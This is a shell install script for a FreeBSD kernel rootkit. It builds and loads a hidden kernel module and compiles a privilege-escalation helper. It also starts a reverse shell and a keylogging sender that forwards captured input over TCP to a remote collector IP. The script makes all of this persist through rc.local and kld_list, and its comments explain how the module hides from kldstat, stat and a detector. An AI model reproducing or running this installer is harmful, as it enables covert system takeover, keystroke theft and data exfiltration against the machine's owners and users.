#!/bin/sh

set -eu

REMOTE_IP="${1:-}"

PROJECT_DIR=$(CDPATH= cd -P "$(dirname "$0")" && pwd)

MODULE_DIR="$PROJECT_DIR/kernel"
USERSPACE_DIR="$PROJECT_DIR/user"
PERSISTENCE_DIR="/boot/modules"

MODULE_FILE="$MODULE_DIR/rootkit.ko"
PERSISTENCE_FILE="$PERSISTENCE_DIR/rootkit.ko"

ELEVATE_SRC="$USERSPACE_DIR/elevate.c"
ELEVATE_BIN="$USERSPACE_DIR/elevate"
REMOTE_SRC="$PROJECT_DIR/remote.c"
REMOTE_BIN="$PROJECT_DIR/remote"

fail() {
    printf 'Installation Error: %s\n' "$*" >&2
    exit 1
}

# The module removes its own name from linker_files, so kldstat stops listing
# it, and it hooks stat(2) so /dev/rootkit looks absent.  open(2) is untouched,
# which makes it the only probe that still answers -- `[ -c /dev/rootkit ]`
# returned false exactly when the module was loaded.
module_loaded() {
    kldstat -q -m rootkit >/dev/null 2>&1 && return 0
    ( : < /dev/rootkit ) 2>/dev/null && return 0
    return 1
}

# Re-running this script while the module is loaded cannot work.  is_hiding_path()
# is a substring match on "rootkit", so once the hooks are live $PROJECT_DIR
# itself (and every source file under it) stops resolving: `make -C` and the
# `[ -d "$MODULE_DIR" ]` guard below both fail with "not found", and the script
# aborts halfway through what looks like a fresh install.  Refuse instead.
if module_loaded; then
    printf 'rootkit.ko is already loaded.\n'
    printf 'It hides its own sources, so this script cannot rebuild them; reboot to start\n'
    printf 'from a clean kernel, or run ./install_hiding for the standalone prototype.\n'
    exit 0
fi

# Checks for the kernel tree, the userspace sources, and the required commands.
[ -d "$MODULE_DIR" ] || fail "Kernel directory not found: $MODULE_DIR"
[ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"

# REMOTE_IP is compiled into the revshell below (-DDEFAULT_REMOTE_IP), so the
# install writes no address to disk. /etc/rootkit_remote_ip used to be a
# permanent on-disk IOC -- the detector greps for exactly that string.
#
# Without the `|| fail` the loop was silent under `set -e`: it only returned the
# status of the last command -v.
for command in make kldload kldstat cc install sysrc realpath; do
    command -v "$command" >/dev/null 2>&1 ||
        fail "required command not found: $command"
done

# Build rootkit.ko
make -C "$MODULE_DIR"
[ -f "$MODULE_FILE" ]

# Build elevate
cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC" "$MODULE_DIR/proc_hiding.c"

# Build revshell inside $MODULE_DIR.  The reverse-shell half of the project is
# optional: if the sources are not shipped, skip them instead of aborting the
# whole install (which would also stop the log sender from being installed).
if [ -f "$MODULE_DIR/revshell.c" ]; then
    # Only bake the address in when there is one. Defining the macro as an
    # empty string would override the fallback in revshell.c (#ifndef
    # DEFAULT_REMOTE_IP) and leave inet_pton with nothing to parse.
    if [ -n "$REMOTE_IP" ]; then
        cc -Wall -Wextra -DDEFAULT_REMOTE_IP="\"$REMOTE_IP\"" -I. -I"$MODULE_DIR" \
            -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" \
            "$MODULE_DIR/proc_hiding.c" || fail "Failed to build revshell"
    else
        cc -Wall -Wextra -I. -I"$MODULE_DIR" \
            -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" \
            "$MODULE_DIR/proc_hiding.c" || fail "Failed to build revshell"
    fi
    chmod 755 "$MODULE_DIR/revshell"
fi

if [ -f "$REMOTE_SRC" ]; then
    cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC"
    chmod 755 "$REMOTE_BIN"
fi

install -d -m 755 "$PERSISTENCE_DIR"
install -m 555 "$MODULE_FILE" "$PERSISTENCE_FILE"

# A minimal image ships without /etc/rc.conf, and sysrc exits non-zero on that
# ("cannot open"), which took the whole install down under `set -e`.
[ -f /etc/rc.conf ] || : > /etc/rc.conf
if ! sysrc -n kld_list 2>/dev/null | tr ' ' '\n' | grep -qx rootkit; then
    sysrc kld_list+=rootkit >/dev/null
fi

# Verify elevate was built successfully
[ -f "$ELEVATE_BIN" ]
[ -x "$ELEVATE_BIN" ]

# Install binaries to /usr/local/bin
install -d -m 755 /usr/local/bin
install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate
if [ -f "$MODULE_DIR/revshell" ]; then
    install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell
fi

# Launch revshell background worker using the installed binary path
if [ -x /usr/local/bin/revshell ]; then
    pkill -f revshell 2>/dev/null || true
    nohup /usr/local/bin/revshell >/dev/null 2>&1 &
fi

# Log sender: reads the kernel capture ring (/dev/rootkit) and forwards it over
# TCP to the collector that runs on $REMOTE_IP (./log there, same port).
RKLOG=/usr/local/bin/rklog
SENDER_SRC="$PROJECT_DIR/logsrc/sender.c"
LOG_PORT="${LOG_PORT:-9999}"

if [ -n "$REMOTE_IP" ] && [ -f "$SENDER_SRC" ]; then
    # Build next to the target and rename into place: writing straight over a
    # running rklog fails with ETXTBSY on FreeBSD.
    if cc -O2 -Wall -Wextra -o "$RKLOG.new" "$SENDER_SRC"; then
        chmod 755 "$RKLOG.new"
        mv -f "$RKLOG.new" "$RKLOG"

        # /etc/rc.conf and /etc/rc.local are on the module's blocked_files list:
        # once it runs, open() on them returns ENOENT.  This pass runs before
        # kldload, so it is the only one that can write them.
        if [ ! -f /etc/rc.local ]; then
            printf '#!/bin/sh\n' > /etc/rc.local
        fi
        chmod +x /etc/rc.local

        # Drop a previous entry first, so re-installing against a different
        # collector does not leave two daemons with two addresses behind.
        if grep -q rklog /etc/rc.local; then
            grep -v rklog /etc/rc.local > /etc/rc.local.new || true
            mv /etc/rc.local.new /etc/rc.local
            chmod +x /etc/rc.local
        fi
        printf '%s %s %s -d\n' "$RKLOG" "$REMOTE_IP" "$LOG_PORT" >> /etc/rc.local

        pkill -f rklog 2>/dev/null || true
        "$RKLOG" "$REMOTE_IP" "$LOG_PORT" -d
    else
        rm -f "$RKLOG.new"
        printf 'Warning: log sender failed to build; keylogging is disabled\n' >&2
    fi
elif [ -z "$REMOTE_IP" ]; then
    printf 'Warning: no collector address given; keylogging is disabled\n' >&2
fi

# Install hiding
cc -Wall -Wextra -o "$PROJECT_DIR/user/hide_kld" "$PROJECT_DIR/user/hide_kld.c"

ABS_PATH=$(realpath "$PROJECT_DIR/user/hide_kld")

if [ ! -f /etc/rc.local ]; then
    echo "#!/bin/sh" > /etc/rc.local
fi
chmod +x /etc/rc.local

# Ensures no duplicate entries in rc.local
if ! grep -q "hide_kld" /etc/rc.local; then
    echo "$ABS_PATH &" >> /etc/rc.local
fi

# Report before loading.  Every path below is on the module's blocked_files
# list (or matches is_hiding_path), so after kldload the `-x` tests fail and
# this summary silently claims the pieces were never installed.
printf 'rootkit.ko installed to %s\n' "$PERSISTENCE_FILE"
if [ -x "$RKLOG" ]; then
    printf 'rklog started (collector %s:%s)\n' "${REMOTE_IP:-none}" "$LOG_PORT"
fi
if [ -x /usr/local/bin/revshell ]; then
    printf 'revshell waiting for a callback from %s\n' "${REMOTE_IP:-none}"
fi

# Load it during the current boot. `set -e` would already have exited on a
# failing kldload, so a post-hoc check would be dead code; say why instead.
kldload "$PERSISTENCE_FILE" ||
    fail "kldload $PERSISTENCE_FILE failed; see dmesg (Unresolved symbol?)"
module_loaded ||
    fail "kldload reported success but the module cannot be reached"

"$ABS_PATH" &
